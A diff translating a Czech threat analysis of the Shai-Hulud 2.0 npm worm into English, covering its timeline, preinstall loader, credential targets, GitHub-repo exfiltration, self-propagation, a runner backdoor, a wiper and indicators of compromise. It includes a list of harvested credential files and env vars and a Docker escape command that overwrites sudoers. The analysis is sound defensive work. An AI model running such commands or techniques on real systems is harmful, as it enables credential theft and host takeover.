@@ -1,30 +1,30 @@
 # 🎯 Threat Overview: Shai-Hulud 2.0
 
-> Kompletní technická analýza npm supply-chain wormu
+> Complete technical analysis of the npm supply-chain worm
 
 ## Timeline
 
-| Datum | Událost |
-|-------|---------|
-| 2025-09-15 | Shai-Hulud v1 – první vlna, 180+ packages |
-| 2025-09-23 | CISA vydává alert |
-| 2025-11-21 | Shai-Hulud 2.0 – upload prvních malicious packages |
-| 2025-11-24 01:22 UTC | První exfiltration repos na GitHub |
-| 2025-11-24 03:00 UTC | Masivní šíření na npm |
-| 2025-11-25 22:45 UTC | Druhá fáze: "The Continued Coming" |
-| 2025-11-26 | GitHub začíná revoking, ~300 public repos |
-| 2025-12-09 | npm plánuje deprecation classic tokens |
+| Date | Event |
+|------|-------|
+| 2025-09-15 | Shai-Hulud v1 – first wave, 180+ packages |
+| 2025-09-23 | CISA issues alert |
+| 2025-11-21 | Shai-Hulud 2.0 – upload of first malicious packages |
+| 2025-11-24 01:22 UTC | First exfiltration repos on GitHub |
+| 2025-11-24 03:00 UTC | Massive spread on npm |
+| 2025-11-25 22:45 UTC | Second phase: "The Continued Coming" |
+| 2025-11-26 | GitHub begins revoking, ~300 public repos |
+| 2025-12-09 | npm plans deprecation of classic tokens |
 
-## Anatomie útoku
+## Attack Anatomy
 
 ### 1. Initial Access
 
-Útočník získá přístup k npm účtu maintainera jedním z těchto způsobů:
+The attacker gains access to a maintainer's npm account through one of these methods:
 
-- **Phishing** – falešné emaily od npm o "MFA update"
-- **Credential stuffing** – použití uniklých hesel z jiných breaches
-- **Kompromitace CI/CD** – krádež tokenů z GitHub Actions
-- **Social engineering** – přímý kontakt s maintainerem
+- **Phishing** – fake emails from npm about "MFA update"
+- **Credential stuffing** – using leaked passwords from other breaches
+- **CI/CD compromise** – stealing tokens from GitHub Actions
+- **Social engineering** – direct contact with maintainer
 
 ### 2. Infection Vector
 
@@ -32,7 +32,7 @@
 Compromised package → npm publish → Developer runs npm install → Payload executes
 ```
 
-**Klíčová změna v 2.0:** Payload se spouští v `preinstall` fázi:
+**Key change in 2.0:** Payload runs in the `preinstall` phase:
 
 ```json
 {
@@ -42,41 +42,41 @@ Compromised package → npm publish → Developer runs npm install → Payload e
 }
 ```
 
-To znamená, že kód běží **PŘED** instalací závislostí a **PŘED** jakýmkoliv statickým skenováním.
+This means the code runs **BEFORE** dependency installation and **BEFORE** any static scanning.
 
 ### 3. Payload Structure
 
 ```
 package/
-├── package.json          # Modified s preinstall script
+├── package.json          # Modified with preinstall script
 ├── setup_bun.js          # Loader (stage 1)
 └── bun_environment.js    # Main payload (stage 2, obfuscated)
 ```
 
 **setup_bun.js** (Loader):
-1. Detekuje OS (Linux/macOS/Windows)
-2. Stáhne a nainstaluje Bun runtime (pokud chybí)
-3. Spustí `bun_environment.js` jako detached proces
+1. Detects OS (Linux/macOS/Windows)
+2. Downloads and installs Bun runtime (if missing)
+3. Runs `bun_environment.js` as a detached process
 
 **bun_environment.js** (Main payload):
-- ~500KB obfuskovaný JavaScript
-- Bundlován se všemi dependencies
-- Používá triple base64 encoding pro exfiltraci
+- ~500KB obfuscated JavaScript
+- Bundled with all dependencies
+- Uses triple base64 encoding for exfiltration
 
 ### 4. Credential Harvesting
 
-Malware aktivně hledá credentials na těchto místech:
+The malware actively searches for credentials in these locations:
 
-#### Lokální soubory
+#### Local Files
 
-| Cesta | Typ |
-|-------|-----|
+| Path | Type |
+|------|------|
 | `~/.npmrc` | npm token |
 | `~/.bun/credentials` | bun credentials |
 | `~/.gitconfig` | Git credentials |
 | `~/.ssh/*` | SSH keys |
 | `~/.aws/credentials` | AWS credentials |
-| `~/.aws/config` | AWS config |
+| `~/.aws/config` | AWS config (scans ALL regions) |
 | `~/.azure/` | Azure credentials |
 | `~/.config/gcloud/application_default_credentials.json` | GCP credentials |
 | `~/.docker/config.json` | Docker registry tokens |
@@ -85,7 +85,7 @@ Malware aktivně hledá credentials na těchto místech:
 #### Environment Variables
 
 ```javascript
-// Targetované env vars
+// Targeted env vars
 const targets = [
   'NPM_TOKEN', 'NODE_AUTH_TOKEN',
   'GITHUB_TOKEN', 'GH_TOKEN', 'GITHUB_PAT',
@@ -100,10 +100,12 @@ const targets = [
 
 #### GitHub Actions Secrets
 
-Malware enumeruje všechny repozitáře uživatele a extrahuje:
+The malware enumerates all user repositories and extracts:
 - Repository secrets
 - Environment secrets
-- Organization secrets (pokud má přístup)
+- Organization secrets (if accessible)
+
+It specifically hunts for `npm_` prefixed secrets in GitHub Actions metadata to pivot and compromise more packages (Secondary Token Mining).
 
 #### Cloud Metadata Services
 
@@ -118,33 +120,33 @@ const imds = {
 
 #### TruffleHog Integration
 
-Malware stahuje legitimní TruffleHog binary a používá ho k aktivnímu vyhledávání secrets v souborovém systému.
+The malware downloads the legitimate TruffleHog binary and uses it to actively search for secrets in the filesystem.
 
 ### 5. Exfiltration
 
-#### Primární metoda: GitHub Repos
+#### Primary method: GitHub Repos
 
 ```javascript
-// Vytvoření exfiltration repo
+// Create exfiltration repo
 const repoName = generateRandomName(); // 18 random chars
 const description = "Sha1-Hulud: The Second Coming.";
 
-// Soubory v repo
+// Files in repo
 const files = [
   'cloud.json',        // Cloud credentials (AWS/GCP/Azure)
-  'contents.json',     // Lokální soubory s credentials
+  'contents.json',     // Local files with credentials
   'environment.json',  // Environment variables
   'truffleSecrets.json', // TruffleHog findings
   'actionsSecrets.json'  // GitHub Actions secrets
 ];
 
-// Data jsou triple base64 encoded
+// Data is triple base64 encoded
 const encoded = btoa(btoa(btoa(JSON.stringify(data))));
 ```
 
-#### Fallback metoda: Cross-victim exfiltration
+#### Fallback method: Cross-victim exfiltration
 
-Pokud nemá GitHub credentials, použije credentials ukradené od jiné oběti k vytvoření exfiltration repo pod jejich účtem.
+If it doesn't have GitHub credentials, it uses credentials stolen from another victim to create an exfiltration repo under their account.
 
 ### 6. Self-Propagation
 
@@ -153,7 +155,7 @@ Pokud nemá GitHub credentials, použije credentials ukradené od jiné oběti k
 async function propagate(npmToken) {
   const packages = await getUserPackages(npmToken);
   const targetCount = Math.min(packages.length, 100); // Max 100 packages
-  
+
   for (const pkg of packages.slice(0, targetCount)) {
     await injectPayload(pkg);
     await publishMaliciousVersion(pkg, npmToken);
@@ -165,7 +167,7 @@ async function propagate(npmToken) {
 
 #### GitHub Discussions Backdoor
 
-Malware vytváří workflow soubor `.github/workflows/discussion.yaml`:
+The malware creates a workflow file `.github/workflows/discussion.yaml`:
 
 ```yaml
 name: Discussion Create
@@ -180,11 +182,22 @@ jobs:
         run: echo ${{ github.event.discussion.body }}
 ```
 
-To registruje infikovaný stroj jako self-hosted runner a umožňuje vzdálené spouštění příkazů přes GitHub Discussions.
+This registers the infected machine as a self-hosted runner and enables remote command execution via GitHub Discussions.
+
+#### GitHub Actions Privilege Escalation
+
+On Linux runners, the malware attempts to gain root access to manipulate DNS and firewalls:
+
+1.  **Sudo:** Attempts `sudo -n true`.
+2.  **Docker Escape:** If sudo fails, it uses Docker to mount the host filesystem and overwrite `/etc/sudoers.d/runner`:
+    ```bash
+    docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"
+    ```
+3.  **Network Control:** Once root, it disables `systemd-resolved`, hijacks DNS via `/tmp/resolved.conf`, and flushes `iptables` to bypass firewalls or redirect traffic.
 
 ### 8. Destructive Fallback (Dead-man switch)
 
-Pokud se nepodaří exfiltrovat data nebo najít tokens:
+If data exfiltration or token discovery fails:
 
 ```javascript
 // Unix wiper
@@ -199,7 +212,7 @@ if (platform === 'win32') {
 }
 ```
 
-## Technické IOC
+## Technical IOCs
 
 ### File Hashes (SHA-256)
 
@@ -210,35 +223,35 @@ bun_environment.js: [varies per version]
 
 ### Network Indicators
 
-- `api.github.com` – pro exfiltraci a propagaci
-- `registry.npmjs.org` – pro publikování malicious packages
-- `github.com/repos/*/releases` – stahování TruffleHog
+- `api.github.com` – for exfiltration and propagation
+- `registry.npmjs.org` – for publishing malicious packages
+- `github.com/repos/*/releases` – downloading TruffleHog
 - Cloud IMDS endpoints
 
 ### Behavioral Indicators
 
-1. Neočekávaná instalace Bun runtime
-2. `bun` nebo `bun_environment` procesy
-3. Přístup k `~/.npmrc`, `~/.aws/`, `~/.azure/`
-4. GitHub API calls z neočekávaných procesů
-5. Vytváření `.truffler-cache` adresáře
-6. Nové workflow soubory v `.github/workflows/`
+1. Unexpected Bun runtime installation
+2. `bun` or `bun_environment` processes
+3. Access to `~/.npmrc`, `~/.aws/`, `~/.azure/`
+4. GitHub API calls from unexpected processes
+5. Creation of `.truffler-cache` directory
+6. New workflow files in `.github/workflows/`
 
-## Zasažené ekosystémy
+## Affected Ecosystems
 
-### Primární: npm
+### Primary: npm
 
 - 796+ unique packages
 - 1092+ malicious versions
-- 20+ milionů weekly downloads
+- 20+ million weekly downloads
 
-### Sekundární: Maven Central
+### Secondary: Maven Central
 
-Přes `org.mvnpm` automatickou konverzi npm→Maven byly zasaženy i Java projekty.
+Through `org.mvnpm` automatic npm→Maven conversion, Java projects were also affected.
 
-### Známé prominentní oběti
+### Known Prominent Victims
 
-| Projekt | Packages |
+| Project | Packages |
 |---------|----------|
 | **Zapier** | zapier-platform-core, zapier-platform-cli, zapier-sdk |
 | **ENS Domains** | @ensdomains/ensjs, @ensdomains/content-hash |
@@ -246,14 +259,14 @@ Přes `org.mvnpm` automatickou konverzi npm→Maven byly zasaženy i Java projek
 | **Postman** | @postman/tunnel-agent, @postman/postman-mcp-cli |
 | **AsyncAPI** | @asyncapi/specs, @asyncapi/openapi-schema-parser |
 
-## Atribuce
+## Attribution
 
-- Možná odlišný threat actor než Shai-Hulud v1
-- Rozdíly v payload struktuře a TTPs
-- Použití stejné naming convention
-- Unit 42 odhaduje s moderate confidence použití LLM pro generování kódu
+- Possibly different threat actor than Shai-Hulud v1
+- Differences in payload structure and TTPs
+- Use of same naming convention
+- Unit 42 estimates with moderate confidence the use of LLM for code generation
 
-## Reference
+## References
 
 - [Palo Alto Unit 42 Analysis](https://unit42.paloaltonetworks.com/npm-supply-chain-attack/)
 - [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/)
